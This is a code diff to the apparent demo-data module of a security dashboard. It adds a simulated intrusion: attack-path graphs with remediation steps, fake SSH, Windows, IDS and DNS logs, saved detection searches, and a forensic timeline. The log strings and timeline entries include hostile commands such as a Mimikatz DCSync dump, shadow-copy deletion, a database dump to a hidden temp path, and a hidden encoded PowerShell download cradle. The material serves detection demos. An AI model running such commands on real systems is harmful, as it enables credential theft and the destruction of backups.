-  return { nodes, edges, summary, generated_at: new Date().toISOString() };
+  return { nodes: allNodes, edges: allEdges, summary, generated_at: new Date().toISOString() };
 })();
 
 // Attack path — matches AttackPathNode / AttackPathEdge / RankedAttackPath types
 const ATTACK_PATH = (() => {
-  // nodes: id is a string, type is 'internet' | 'agent'
-  const internetNode = { id: 'internet', type: 'internet' as const, risk_score: 100, risk_level: 'critical', max_epss: 0.9, has_kev: true, kev_count: 2, exposed: true, compromise_cost: 0 };
-  const agentNodes = D.agents.map((a: any, i: number) => ({
-    id:              String(a.id),
-    type:            'agent' as const,
-    agent_id:        a.id,
-    hostname:        a.hostname,
-    risk_score:      [82, 67, 44, 31][i] ?? 40,
-    risk_level:      ['critical', 'high', 'medium', 'low'][i] ?? 'medium',
-    max_epss:        [0.85, 0.62, 0.3, 0.1][i] ?? 0.2,
-    has_kev:         i < 2,
-    kev_count:       i < 2 ? 1 : 0,
-    exposed:         i === 0,
-    compromise_cost: [10, 25, 45, 80][i] ?? 50,
-  }));
-  const nodes = [internetNode, ...agentNodes];
+  const a0 = String(D.agents[0]?.id ?? '1');
+  const a1 = String(D.agents[1]?.id ?? '2');
+  const a2 = String(D.agents[2]?.id ?? '3');
+  const a3 = String(D.agents[3]?.id ?? '4');
 
-  // edges: source/target are string IDs, kind is 'internet_exposure' | 'lateral'
-  const edges = [
-    { source: 'internet', target: String(D.agents[0]?.id ?? 1), kind: 'internet_exposure' as const },
-    ...D.agents.slice(0, -1).map((a: any, i: number) => ({
-      source: String(a.id),
-      target: String(D.agents[i + 1]?.id ?? a.id),
-      kind:   'lateral' as const,
-    })),
+  const internetNode = {
+    id: 'internet', type: 'internet' as const,
+    risk_score: 100, risk_level: 'critical', max_epss: 0.9, has_kev: true, kev_count: 2,
+    exposed: true, compromise_cost: 0, open_alert_count: 0,
+    kill_chain_phase: 'reconnaissance', priv_level: 'none', blast_radius: D.agents.length + 4, is_chokepoint: false,
+  };
+
+  const agentNodes = D.agents.map((a: any, i: number) => ({
+    id:               String(a.id),
+    type:             'agent' as const,
+    agent_id:         a.id,
+    hostname:         a.hostname,
+    risk_score:       [82, 67, 44, 31][i] ?? 40,
+    risk_level:       ['critical', 'high', 'medium', 'low'][i] ?? 'medium',
+    max_epss:         [0.85, 0.62, 0.3, 0.1][i] ?? 0.2,
+    has_kev:          i < 2, kev_count: i < 2 ? 1 : 0,
+    exposed:          i === 0, compromise_cost: [10, 25, 45, 80][i] ?? 50,
+    open_alert_count: D.alerts.filter((al: any) => al.agent_id === a.id).length,
+    kill_chain_phase: (['initial_access', 'lateral_movement', 'privilege_escalation', 'impact'] as const)[i] ?? 'lateral_movement',
+    priv_level:       (['user', 'admin', 'root', 'system'] as const)[i] ?? 'user',
+    blast_radius:     [6, 4, 2, 1][i] ?? 1,
+    is_chokepoint:    i === 1,
+  }));
+
+  const extraNodes = [
+    {
+      id: 'cloud-ec2', type: 'cloud' as const,
+      hostname: 'ec2-web-prod', risk_score: 55, risk_level: 'medium',
+      max_epss: 0.45, has_kev: false, kev_count: 0, exposed: true, compromise_cost: 35,
+      open_alert_count: 2, kill_chain_phase: 'collection', priv_level: 'user',
+      blast_radius: 3, is_chokepoint: false,
+    },
+    {
+      id: 'k8s-pod', type: 'container' as const,
+      hostname: 'nginx-pod-7f2', risk_score: 70, risk_level: 'high',
+      max_epss: 0.55, has_kev: true, kev_count: 1, exposed: false, compromise_cost: 20,
+      open_alert_count: 1, kill_chain_phase: 'execution', priv_level: 'root',
+      blast_radius: 5, is_chokepoint: true,
+    },
+    {
+      id: 'dc-01', type: 'domain_controller' as const,
+      hostname: 'DC01.corp.local', risk_score: 95, risk_level: 'critical',
+      max_epss: 0.78, has_kev: true, kev_count: 3, exposed: false, compromise_cost: 5,
+      open_alert_count: 4, kill_chain_phase: 'impact', priv_level: 'system',
+      blast_radius: 12, is_chokepoint: true,
+    },
   ];
 
-  // top_paths: hops is string[], plus cost/score fields
-  const top_paths = [{
-    hops:               ['internet', ...D.agents.map((a: any) => String(a.id))],
-    total_cost:         10,
-    target_hostname:    D.agents[D.agents.length - 1]?.hostname ?? 'db-server-02',
-    target_risk_level:  'low',
-    score:              87,
-  }];
+  const nodes = [internetNode, ...agentNodes, ...extraNodes];
+
+  const edges = [
+    { source: 'internet',  target: a0,         kind: 'internet_exposure' as const, technique_id: 'T1190',     technique_name: 'Exploit Public-Facing App',        description: 'CVE-2024-1234 RCE in exposed web service (EPSS 0.85)' },
+    { source: a0,          target: a1,          kind: 'lateral'           as const, technique_id: 'T1021.001', technique_name: 'Remote Desktop Protocol',           description: 'RDP pivot using harvested credentials from LSASS dump' },
+    { source: a1,          target: a2,          kind: 'lateral'           as const, technique_id: 'T1570',     technique_name: 'Lateral Tool Transfer',             description: 'SMB file share exploitation for tool staging' },
+    { source: a2,          target: a3,          kind: 'lateral'           as const, technique_id: 'T1021.002', technique_name: 'SMB/Windows Admin Shares',          description: 'Pass-the-hash via extracted NTLM hash' },
+    { source: a0,          target: a2,          kind: 'priv_esc'          as const, technique_id: 'T1068',     technique_name: 'Exploitation for Privilege Escalation', description: 'Local kernel exploit CVE-2024-5678 — EPSS 0.85, leads to SYSTEM' },
+    { source: a0,          target: 'cloud-ec2', kind: 'cloud_jump'        as const, technique_id: 'T1552.005', technique_name: 'Cloud Instance Metadata API',       description: 'IMDSv1 credential theft from EC2 instance metadata service' },
+    { source: 'cloud-ec2', target: 'k8s-pod',   kind: 'container_escape'  as const, technique_id: 'T1611',     technique_name: 'Escape to Host',                    description: 'Privileged container escape via /proc/sysrq-trigger' },
+    { source: a1,          target: 'dc-01',     kind: 'priv_esc'          as const, technique_id: 'T1003.001', technique_name: 'LSASS Memory Dump / DCSync',        description: 'DCSync after LSASS dump — Domain Admin credentials obtained' },
+  ];
+
+  const top_paths = [
+    {
+      hops: ['internet', a0, a1, 'dc-01'],
+      total_cost: 15, target_hostname: 'DC01.corp.local', target_risk_level: 'critical', score: 97,
+      path_type: 'priv_esc' as const,
+      kill_chain_phases: ['reconnaissance', 'initial_access', 'lateral_movement', 'privilege_escalation', 'impact'],
+      techniques: [
+        { id: 'T1190',     name: 'Exploit Public-Facing App' },
+        { id: 'T1021.001', name: 'Remote Desktop Protocol' },
+        { id: 'T1003.001', name: 'LSASS Memory Dump / DCSync' },
+      ],
+      remediation: [
+        'Patch CVE-2024-1234 on internet-facing web server — EPSS 0.85, actively exploited',
+        'Enable Credential Guard on all Windows hosts to block LSASS memory dumping',
+        'Restrict RDP access — enforce MFA, limit to jump hosts only',
+        'Add Domain Admin accounts to Protected Users security group',
+        'Enable Windows Event ID 4662 monitoring for DCSync detection',
+      ],
+    },
+    {
+      hops: ['internet', a0, 'cloud-ec2', 'k8s-pod'],
+      total_cost: 30, target_hostname: 'nginx-pod-7f2', target_risk_level: 'high', score: 79,
+      path_type: 'cloud' as const,
+      kill_chain_phases: ['reconnaissance', 'initial_access', 'collection', 'execution'],
+      techniques: [
+        { id: 'T1190',     name: 'Exploit Public-Facing App' },
+        { id: 'T1552.005', name: 'Cloud Instance Metadata API' },
+        { id: 'T1611',     name: 'Escape to Host' },
+      ],
+      remediation: [
+        'Enable IMDSv2 on all EC2 instances — disable IMDSv1 to block metadata credential theft',
+        'Remove privileged: true from all Kubernetes pod specs',
+        'Apply Kubernetes NetworkPolicy to restrict pod-to-pod communication',
+        'Enable runtime threat detection (Falco / Sysdig) on all k8s nodes',
+        'Audit EC2 IAM instance roles — apply least-privilege policies',
+      ],
+    },
+    {
+      hops: ['internet', a0, a1, a2, a3],
+      total_cost: 10, target_hostname: D.agents[3]?.hostname ?? 'db-server-02', target_risk_level: 'low', score: 61,
+      path_type: 'lateral' as const,
+      kill_chain_phases: ['reconnaissance', 'initial_access', 'lateral_movement', 'lateral_movement', 'impact'],
+      techniques: [
+        { id: 'T1190',     name: 'Exploit Public-Facing App' },
+        { id: 'T1021.001', name: 'Remote Desktop Protocol' },
+        { id: 'T1570',     name: 'Lateral Tool Transfer' },
+        { id: 'T1021.002', name: 'SMB/Windows Admin Shares' },
+      ],
+      remediation: [
+        'Segment internal network — block lateral SMB/RDP traffic between workstations with firewall rules',
+        'Deploy EDR with behavioral lateral movement detection across all endpoints',
+        'Remove local admin rights from standard user accounts (least privilege)',
+        'Enable SMB signing on all hosts to prevent pass-the-hash attacks',
+      ],
+    },
+  ];
 
   return { nodes, edges, top_paths, has_entry_point: true };
 })();
@@ -363,6 +918,122 @@ const MDM_DEVICES = [
     battery_level: 95, created_at: '2026-01-20T09:00:00Z',
   },
 ];
+
+// ── Rich search log dataset (used by /logs/search + /logs/stats) ─────────────
+
+const DEMO_SEARCH_LOGS = (() => {
+  const now = Date.now();
+  const ts  = (hoursAgo: number) => new Date(now - hoursAgo * 3600000).toISOString();
+  const pf  = (obj: Record<string, string>) => JSON.stringify(obj);
+  let id    = 5000;
+  const rows: any[] = [];
+
+  const add = (agId: number, src: string, msg: string, fields: Record<string, string>, hAgo: number) =>
+    rows.push({ id: id++, agent_id: agId, log_source: src, log_message: msg, parsed_fields: pf(fields), collected_at: ts(hAgo) });
+
+  // SSH auth failures (brute-force from external IP)
+  const USERS = ['root','jdoe','admin','ubuntu','svc_web','svc_deploy','Administrator','xcsupport','soc_admin','postgres'];
+  for (let i = 0; i < 22; i++) {
+    const user = USERS[i % USERS.length];
+    add(1, 'sshd', `Failed password for ${user} from 185.220.101.35 port ${40000+i} ssh2`,
+      { auth_result: 'failure', auth_method: 'password', user, src_ip: '185.220.101.35', src_port: String(40000+i), format: 'syslog' }, i * 0.08 + 1);
+  }
+
+  // SSH successes (internal)
+  add(1,'sshd','Accepted publickey for ubuntu from 10.10.1.100 port 52341 ssh2',{ auth_result:'success',auth_method:'publickey',user:'ubuntu',src_ip:'10.10.1.100',format:'syslog' },4.5);
+  add(2,'sshd','Accepted password for svc_deploy from 10.10.5.100 port 55210 ssh2',{ auth_result:'success',auth_method:'password',user:'svc_deploy',src_ip:'10.10.5.100',format:'syslog' },3.2);
+  add(3,'sshd','Accepted publickey for jdoe from 10.10.1.50 port 48201 ssh2',{ auth_result:'success',auth_method:'publickey',user:'jdoe',src_ip:'10.10.1.50',format:'syslog' },2.1);
+  add(1,'sshd','Disconnected from authenticating user root 185.220.101.35 port 47210 [preauth]',{ auth_result:'failure',user:'root',src_ip:'185.220.101.35',format:'syslog' },0.9);
+
+  // Windows Security Events
+  for (let i = 0; i < 14; i++) {
+    add(1,'WinEvent/Security',`EventCode=4625 Logon failure. Account: Administrator Source: 185.220.101.35 Attempt #${i+1}`,
+      { event_id:'4625',target_user:'Administrator',src_ip:'185.220.101.35',auth_result:'failure',format:'winevent' }, i * 0.04 + 0.5);
+  }
+  add(1,'WinEvent/Security','EventCode=4624 Logon success. Account: jdoe Type: 3 Source: 10.10.1.50',{ event_id:'4624',target_user:'jdoe',src_ip:'10.10.1.50',logon_type:'3',auth_result:'success',format:'winevent' },6);
+  add(2,'WinEvent/Security','EventCode=4624 Logon success. Account: svc_web Type: 5 Service',{ event_id:'4624',target_user:'svc_web',logon_type:'5',auth_result:'success',format:'winevent' },5);
+  add(3,'WinEvent/Security','EventCode=4624 NTLM Logon: Administrator from 10.10.2.10 (Pass-the-Hash suspected)',{ event_id:'4624',target_user:'Administrator',src_ip:'10.10.2.10',logon_type:'3',auth_result:'success',format:'winevent' },4*24);
+  add(1,'WinEvent/Security','EventCode=4688 New process: powershell.exe -nop -w hidden -EncodedCommand JABjA...',{ event_id:'4688',process:'powershell.exe',subject_user:'jdoe',format:'winevent' },5*24);
+  add(1,'WinEvent/Security','EventCode=4688 New process: cmd.exe /c whoami /all',{ event_id:'4688',process:'cmd.exe',subject_user:'jdoe',format:'winevent' },5*24+0.5);
+  add(2,'WinEvent/Security','EventCode=4688 New process: vssadmin.exe delete shadows /all /quiet',{ event_id:'4688',process:'vssadmin.exe',subject_user:'SYSTEM',format:'winevent' },1*24);
+  add(3,'WinEvent/Security','EventCode=4720 User account created: xcsupport by Administrator',{ event_id:'4720',target_user:'xcsupport',subject_user:'Administrator',format:'winevent' },3*24);
+  add(3,'WinEvent/Security','EventCode=4732 xcsupport added to Domain Admins by Administrator',{ event_id:'4732',target_user:'xcsupport',subject_user:'Administrator',format:'winevent' },3*24+0.1);
+  add(1,'WinEvent/Security','EventCode=4104 ScriptBlock: Invoke-Portscan -Hosts 10.10.1.0/24 -Ports 22,445,3389',{ event_id:'4104',subject_user:'jdoe',process:'powershell.exe',format:'winevent' },5*24+1);
+  add(1,'WinEvent/Security','EventCode=4103 Module: Invoke-Mimikatz -DumpCreds executed by jdoe',{ event_id:'4103',subject_user:'jdoe',process:'powershell.exe',format:'winevent' },3*24);
+  add(3,'WinEvent/Security','EventCode=4740 Account locked: jdoe after 5 failures',{ event_id:'4740',target_user:'jdoe',auth_result:'failure',format:'winevent' },0.3);
+
+  // nginx access logs
+  const PAGES = ['/api/users','/api/login','/admin/config','/api/alerts','/api/agents','/etc/passwd','/wp-admin','/api/export'];
+  const STATUS = ['200','200','200','403','404','500','200','200'];
+  for (let i = 0; i < 18; i++) {
+    const ip  = i % 3 === 0 ? '185.220.101.35' : (i % 4 === 0 ? '10.10.1.80' : '10.10.1.45');
+    const st  = STATUS[i % STATUS.length];
+    const pg  = PAGES[i % PAGES.length];
+    const mtd = i % 5 === 0 ? 'POST' : 'GET';
+    add(1,'nginx',`${ip} - - [14/Jul/2026:0${i%10}:00:00 +0000] "${mtd} ${pg} HTTP/1.1" ${st} 4821`,
+      { src_ip:ip, auth_result:st==='200'?'success':st==='403'?'denied':'error', format:'nginx' }, i * 0.3);
+  }
+
+  // CEF / IDS events
+  add(1,'pf-fw-01','CEF:0|PFSense|pfSense|2.6.0|block|Blocked outbound to C2|9|src=10.10.1.50 dst=185.220.101.35 dpt=443',
+    { device_vendor:'PFSense',cef_name:'Blocked outbound to C2',severity:'critical',src_ip:'10.10.1.50',dst_ip:'185.220.101.35',format:'cef' },4.8);
+  add(1,'pf-fw-01','CEF:0|PFSense|pfSense|2.6.0|block|SMB scan blocked|7|src=10.10.1.50 dst=10.10.2.0/24 dpt=445',
+    { device_vendor:'PFSense',cef_name:'SMB scan blocked',severity:'high',src_ip:'10.10.1.50',format:'cef' },4*24);
+  add(1,'snort','CEF:0|Snort|IDS|3.1.6|2001|Cobalt Strike Beacon|10|src=10.10.1.50 dst=185.220.101.35',
+    { device_vendor:'Snort',cef_name:'Cobalt Strike Beacon',severity:'critical',src_ip:'10.10.1.50',dst_ip:'185.220.101.35',format:'cef' },5);
+  add(2,'snort','CEF:0|Snort|IDS|3.1.6|1001|Nmap SYN Scan|7|src=185.220.101.35 dst=10.10.1.0/24',
+    { device_vendor:'Snort',cef_name:'Nmap SYN Scan',severity:'high',src_ip:'185.220.101.35',format:'cef' },5*24);
+  add(2,'snort','CEF:0|Snort|IDS|3.1.6|3001|DCSync Detected|10|src=10.10.2.10 dst=10.10.3.5',
+    { device_vendor:'Snort',cef_name:'DCSync Detected',severity:'critical',src_ip:'10.10.2.10',format:'cef' },3*24);
+
+  // JSON structured logs
+  add(1,'xcloak-agent','{"level":"error","msg":"FIM: /etc/passwd modified","user":"root","hostname":"win-workstation-05"}',
+    { severity:'error',user:'root',hostname:'win-workstation-05',format:'json' },1.2);
+  add(1,'xcloak-agent','{"level":"warn","msg":"Unsigned driver loaded: evil.sys","pid":8812,"hostname":"win-workstation-05"}',
+    { severity:'warn',hostname:'win-workstation-05',format:'json' },6);
+  add(2,'xcloak-agent','{"level":"error","msg":"pg_dumpall executed — 14.2GB dump","user":"postgres","hostname":"db-server-02"}',
+    { severity:'error',user:'postgres',hostname:'db-server-02',format:'json' },2*24);
+  add(3,'xcloak-agent','{"level":"critical","msg":"DCSync attack — 142 accounts dumped","hostname":"dc-01"}',
+    { severity:'critical',hostname:'dc-01',format:'json' },3*24);
+  add(1,'xcloak-agent','{"level":"info","msg":"Agent isolated from network","hostname":"win-workstation-05","by":"soc-admin"}',
+    { severity:'info',hostname:'win-workstation-05',format:'json' },0.2);
+
+  // DNS / syslog
+  add(1,'named','query: a1b2c3d4e5.cobalt-beacon.io IN A from 10.10.1.50 → 185.220.101.35',{ src_ip:'10.10.1.50',format:'syslog' },5);
+  add(2,'named','REFUSED query from 10.10.2.10: upload.secure-transfer.io IN A',{ src_ip:'10.10.2.10',auth_result:'denied',format:'syslog' },2*24);
+  add(1,'named','query: a1b2c3d4e5.cobalt-beacon.io IN A (repeat beacon check-in)',{ src_ip:'10.10.1.50',format:'syslog' },4.9);
+  add(1,'named','query: a1b2c3d4e5.cobalt-beacon.io IN A (repeat)',{ src_ip:'10.10.1.50',format:'syslog' },4.8);
+
+  // Misc system
+  add(1,'auditd','type=EXECVE a0="vssadmin" a1="delete" a2="shadows" a3="/all" uid=0 pid=11234 hostname=win-workstation-05',
+    { user:'root',process:'vssadmin',hostname:'win-workstation-05',format:'syslog' },1*24);
+  add(2,'postgres','LOG: duration: 342234ms statement: pg_dumpall -U postgres -f /tmp/.cache/dump.sql',
+    { user:'postgres',process:'postgres',hostname:'db-server-02',format:'syslog' },2*24);
+  add(1,'cron','CRON[8812]: (jdoe) CMD (C:\\Windows\\System32\\wscript.exe C:\\ProgramData\\beacon.vbs)',
+    { user:'jdoe',process:'CRON',hostname:'win-workstation-05',format:'syslog' },6*24);
+  add(3,'systemd','winupdsvc.service: Started Windows Update Helper.',{ process:'systemd',hostname:'dc-01',format:'syslog' },6*24);
+  add(1,'flask-api','ERROR [app.auth] Login failed for svc_api from 192.168.1.200: token expired',
+    { user:'svc_api',src_ip:'192.168.1.200',auth_result:'error',format:'raw' },2);
+  add(1,'flask-api','INFO [app.auth] soc_admin authenticated successfully (MFA verified)',
+    { user:'soc_admin',src_ip:'10.10.5.100',auth_result:'success',format:'raw' },0.5);
+  add(2,'postgres','ERROR: duplicate key value violates unique constraint "users_email_key"',
+    { user:'postgres',process:'postgres',format:'raw' },1.5);
+  add(1,'kernel','usb 1-1: new high-speed USB device number 3 (SanDisk USB 3.0)',{ process:'kernel',hostname:'win-workstation-05',format:'syslog' },7*24);
+
+  return rows.sort((a: any, b: any) => new Date(b.collected_at).getTime() - new Date(a.collected_at).getTime());
+})();
+
+// Saved search pool for demo
+const DEMO_SAVED_SEARCHES = [
+  { id:1, name:'Auth Failures from External',      query:'src_ip:185.220.101.35 auth_result:failure', time_range:'24h', run_count:12, last_run_at: new Date(Date.now()-3600000).toISOString(),  created_at: new Date(Date.now()-86400000*7).toISOString() },
+  { id:2, name:'Windows Privilege Escalation',      query:'event_id:4720 OR event_id:4732',             time_range:'7d',  run_count:5,  last_run_at: new Date(Date.now()-7200000).toISOString(),  created_at: new Date(Date.now()-86400000*5).toISOString() },
+  { id:3, name:'PowerShell Execution Events',       query:'event_id:4104 | stats count by user',        time_range:'7d',  run_count:8,  last_run_at: new Date(Date.now()-1800000).toISOString(),  created_at: new Date(Date.now()-86400000*3).toISOString() },
+  { id:4, name:'C2 Indicators (regex)',             query:'/cobalt.beacon|secure.transfer/',             time_range:'30d', run_count:3,  last_run_at: new Date(Date.now()-86400000).toISOString(), created_at: new Date(Date.now()-86400000*14).toISOString() },
+  { id:5, name:'Credential Dump Detection',         query:'DCSync OR mimikatz OR lsass | top 5 user',   time_range:'30d', run_count:2,  last_run_at: new Date(Date.now()-86400000*2).toISOString(),created_at: new Date(Date.now()-86400000*10).toISOString() },
+];
+// mutable copy so saves/deletes work within a session
+let _savedSearches = [...DEMO_SAVED_SEARCHES];
+let _nextSavedId   = 100;
 
 // Live log lines
 const LIVE_LOG_LINES = D.endpoint_logs.slice(0, 30).map((l: any) => ({
@@ -463,17 +1134,211 @@ function dashboardMetrics(range: string) {
   };
 }
 
+// ── Forensic timeline (45 events, 7-day attack story) ────────────────────────
+
+const FORENSIC_TIMELINE = (() => {
+  const now = Date.now();
+  const t = (daysAgo: number, hoursAgo = 0, minutesAgo = 0) =>
+    new Date(now - daysAgo * 86400000 - hoursAgo * 3600000 - minutesAgo * 60000).toISOString();
+
+  const events = [
+    // ── DAY 7 — Initial access via USB + phishing ──────────────────────────
+    { id: 1001, agent_id: 1, hostname: 'win-workstation-05', event_type: 'login', severity: 'info', created_at: t(7, 8, 0),
+      message: 'Successful login: jdoe from 10.10.1.50 (workstation console)',
+      details: { username: 'jdoe', source_ip: '10.10.1.50', logon_type: 'interactive', session_id: 'S-1-5-21-3422' } },
+    { id: 1002, agent_id: 1, hostname: 'win-workstation-05', event_type: 'usb', severity: 'medium', created_at: t(7, 9, 0),
+      message: 'USB mass storage inserted: SanDisk USB 3.0 32GB (serial AA13B4C2)',
+      mitre_technique: 'T1091', mitre_name: 'Replication Through Removable Media',
+      details: { device: 'SanDisk USB 3.0', size: '32GB', serial: 'AA13B4C2', vendor_id: '0781', product_id: '5581' } },
+    { id: 1003, agent_id: 1, hostname: 'win-workstation-05', event_type: 'browser', severity: 'medium', created_at: t(7, 8, 30),
+      message: 'Downloaded: update-critical.zip from cdn.office365-update[.]com (Chrome)',
+      mitre_technique: 'T1566.002', mitre_name: 'Spearphishing Link',
+      details: { browser: 'chrome', url: 'https://cdn.office365-update[.]com/update-critical.zip', filename: 'update-critical.zip', size_mb: 4.7 } },
+    { id: 1004, agent_id: 1, hostname: 'win-workstation-05', event_type: 'file', severity: 'high', created_at: t(7, 9, 3),
+      message: 'Executable written from USB: D:\\setup.exe → C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe',
+      mitre_technique: 'T1204', mitre_name: 'User Execution',
+      details: { src: 'D:\\setup.exe', dst: 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe', size_mb: 2.1, sha256: 'e3b0c44298fc1c14...b855' } },
+
+    // ── DAY 6 — Execution + persistence ───────────────────────────────────
+    { id: 1005, agent_id: 1, hostname: 'win-workstation-05', event_type: 'powershell', severity: 'critical', created_at: t(6, 14, 20),
+      message: 'Encoded PowerShell: bypass policy + download cradle detected (parent: svchost32.exe)',
+      mitre_technique: 'T1059.001', mitre_name: 'PowerShell',
+      details: { cmdline: 'powershell.exe -nop -w hidden -EncodedCommand JABjA...', pid: 4412, parent: 'svchost32.exe', encoded: true } },
+    { id: 1006, agent_id: 1, hostname: 'win-workstation-05', event_type: 'scheduled_task', severity: 'high', created_at: t(6, 14, 25),
+      message: 'Scheduled task created: \\Microsoft\\Windows\\Maintenance\\WinUpdate (every 4h)',
+      mitre_technique: 'T1053.005', mitre_name: 'Scheduled Task/Job',
+      details: { task_name: '\\Microsoft\\Windows\\Maintenance\\WinUpdate', trigger: 'PT4H repeat', action: 'wscript.exe C:\\ProgramData\\beacon.vbs', created_by: 'jdoe' } },
+    { id: 1007, agent_id: 1, hostname: 'win-workstation-05', event_type: 'registry', severity: 'high', created_at: t(6, 14, 30),
+      message: 'Run key added: HKCU\\…\\Run → "Updater" = C:\\ProgramData\\beacon.vbs',
+      mitre_technique: 'T1547.001', mitre_name: 'Registry Run Keys / Startup Folder',
+      details: { key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', value: 'Updater', data: 'C:\\ProgramData\\beacon.vbs', operation: 'SET' } },
+    { id: 1008, agent_id: 1, hostname: 'win-workstation-05', event_type: 'service', severity: 'high', created_at: t(6, 15, 0),
+      message: 'New service installed: "Windows Update Helper" (winupdsvc) → C:\\ProgramData\\svchost32.exe',
+      mitre_technique: 'T1543.003', mitre_name: 'Windows Service',
+      details: { service_name: 'winupdsvc', display_name: 'Windows Update Helper', binary: 'C:\\ProgramData\\svchost32.exe', start_type: 'automatic', pid: 5512 } },
+
+    // ── DAY 5 — C2 beacon + discovery ─────────────────────────────────────
+    { id: 1009, agent_id: 1, hostname: 'win-workstation-05', event_type: 'dns', severity: 'high', created_at: t(5, 10, 0),
+      message: 'DGA domain queried: a1b2c3d4e5.cobalt-beacon[.]io → 185.220.101.35',
+      mitre_technique: 'T1071.004', mitre_name: 'DNS Protocol (C2)',
+      details: { query: 'a1b2c3d4e5.cobalt-beacon[.]io', response_ip: '185.220.101.35', record_type: 'A', query_count: 47, is_dga: true } },
+    { id: 1010, agent_id: 1, hostname: 'win-workstation-05', event_type: 'network', severity: 'high', created_at: t(5, 10, 2),
+      message: 'C2 beacon: 185.220.101.35:443 — 127 packets, avg 12 KB/hr over 8h',
+      mitre_technique: 'T1071.001', mitre_name: 'Web Protocols (C2)',
+      details: { dst_ip: '185.220.101.35', dst_port: 443, protocol: 'HTTPS', bytes_sent: 245760, bytes_recv: 51200, duration_min: 480 } },
+    { id: 1011, agent_id: 1, hostname: 'win-workstation-05', event_type: 'powershell', severity: 'high', created_at: t(5, 11, 0),
+      message: 'Network enumeration: Invoke-Portscan 10.10.1.0/24 — ports 22,445,3389',
+      mitre_technique: 'T1018', mitre_name: 'Remote System Discovery',
+      details: { cmdline: 'powershell.exe -c "Invoke-Portscan -Hosts 10.10.1.0/24 -Ports 22,445,3389"', pid: 6621, script_block_logged: true } },
+    { id: 1012, agent_id: 1, hostname: 'win-workstation-05', event_type: 'bash', severity: 'medium', created_at: t(5, 11, 30),
+      message: 'Privilege enumeration: whoami /all, net user /domain, net group "Domain Admins"',
+      mitre_technique: 'T1069', mitre_name: 'Permission Groups Discovery',
+      details: { shell: 'cmd.exe', commands: ['whoami /all', 'net user /domain', 'net group "Domain Admins" /domain'], pid: 6890 } },
+    { id: 1013, agent_id: 1, hostname: 'win-workstation-05', event_type: 'alert', severity: 'high', created_at: t(5, 11, 35),
+      message: 'SIGMA: Suspicious PowerShell Network Scan — Invoke-Portscan on win-workstation-05',
+      mitre_technique: 'T1018', mitre_name: 'Remote System Discovery',
+      details: { rule: 'sigma_powershell_network_scan', alert_id: 4412, matched_fields: ['cmdline'], confidence: 0.92 } },
+
+    // ── DAY 4 — Lateral movement ───────────────────────────────────────────
+    { id: 1014, agent_id: 1, hostname: 'win-workstation-05', event_type: 'network', severity: 'medium', created_at: t(4, 15, 50),
+      message: 'Outbound SMB (445) sweep to 14 internal hosts — lateral movement scan',
+      mitre_technique: 'T1021.002', mitre_name: 'SMB/Windows Admin Shares',
+      details: { dst_ips: ['10.10.1.55', '10.10.1.60', '10.10.1.70', '10.10.1.80'], dst_port: 445, protocol: 'SMB2', connection_count: 14 } },
+    { id: 1015, agent_id: 2, hostname: 'db-server-02', event_type: 'login', severity: 'high', created_at: t(4, 16, 0),
+      message: 'Suspicious login: jdoe from 10.10.1.50 via SMB/PsExec (NTLM auth)',
+      mitre_technique: 'T1021.002', mitre_name: 'SMB/Windows Admin Shares',
+      details: { username: 'jdoe', source_ip: '10.10.1.50', logon_type: 'network', auth_method: 'NTLM', tool_hint: 'PsExec' } },
+    { id: 1016, agent_id: 2, hostname: 'db-server-02', event_type: 'bash', severity: 'critical', created_at: t(4, 16, 5),
+      message: 'PSEXESVC shell: cmd.exe spawned as NT AUTHORITY\\SYSTEM on db-server-02',
+      mitre_technique: 'T1570', mitre_name: 'Lateral Tool Transfer',
+      details: { shell: 'cmd.exe', parent: 'PSEXESVC.exe', user: 'NT AUTHORITY\\SYSTEM', pid: 7741, remote_origin: '10.10.1.50' } },
+    { id: 1017, agent_id: 3, hostname: 'dc-01', event_type: 'login', severity: 'critical', created_at: t(4, 17, 0),
+      message: 'Pass-the-Hash to Domain Controller: Administrator from db-server-02 (NTLM, no Kerberos)',
+      mitre_technique: 'T1550.002', mitre_name: 'Pass the Hash',
+      details: { username: 'Administrator', source_ip: '10.10.2.10', logon_type: 'network', auth_method: 'NTLM', lm_hash_used: true } },
+
+    // ── DAY 3 — Domain compromise + defense evasion ────────────────────────
+    { id: 1018, agent_id: 3, hostname: 'dc-01', event_type: 'powershell', severity: 'critical', created_at: t(3, 9, 0),
+      message: 'DCSync attack: Mimikatz lsadump::dcsync /domain /all — 142 account hashes dumped',
+      mitre_technique: 'T1003.006', mitre_name: 'DCSync',
+      details: { cmdline: 'mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" exit', pid: 8821, accounts_dumped: 142 } },
+    { id: 1019, agent_id: 3, hostname: 'dc-01', event_type: 'group_policy', severity: 'critical', created_at: t(3, 9, 30),
+      message: 'GPO modified: Default Domain Policy — Defender disabled, audit logging off, PS unrestricted',
+      mitre_technique: 'T1562.001', mitre_name: 'Disable or Modify Tools',
+      details: { gpo_name: 'Default Domain Policy', gpo_guid: '{31B2F340-016D-11D2-945F-00C04FB984F9}', changes: ['Defender disabled', 'Audit logging off', 'PS unrestricted'], modified_by: 'Administrator' } },
+    { id: 1020, agent_id: 3, hostname: 'dc-01', event_type: 'registry', severity: 'high', created_at: t(3, 10, 0),
+      message: 'SecurityHealthService disabled via registry: Start changed 2 → 4',
+      mitre_technique: 'T1562.001', mitre_name: 'Disable or Modify Tools',
+      details: { key: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService', value: 'Start', old_data: 2, new_data: 4, operation: 'SET' } },
+    { id: 1021, agent_id: 3, hostname: 'dc-01', event_type: 'user_action', severity: 'critical', created_at: t(3, 10, 15),
+      message: 'Backdoor account created: xcsupport — added to Domain Admins + Enterprise Admins',
+      mitre_technique: 'T1136.002', mitre_name: 'Domain Account',
+      details: { username: 'xcsupport', groups: ['Domain Admins', 'Enterprise Admins'], created_by: 'Administrator', sid: 'S-1-5-21-3422-1150' } },
+    { id: 1022, agent_id: 3, hostname: 'dc-01', event_type: 'alert', severity: 'critical', created_at: t(3, 10, 20),
+      message: 'CRITICAL: DCSync credential dump — all domain hashes may be compromised',
+      mitre_technique: 'T1003.006', mitre_name: 'DCSync',
+      details: { rule: 'sigma_dcsync_attack', alert_id: 5523, matched_fields: ['eventid', 'cmdline'], confidence: 0.98 } },
+
+    // ── DAY 2 — Exfiltration ───────────────────────────────────────────────
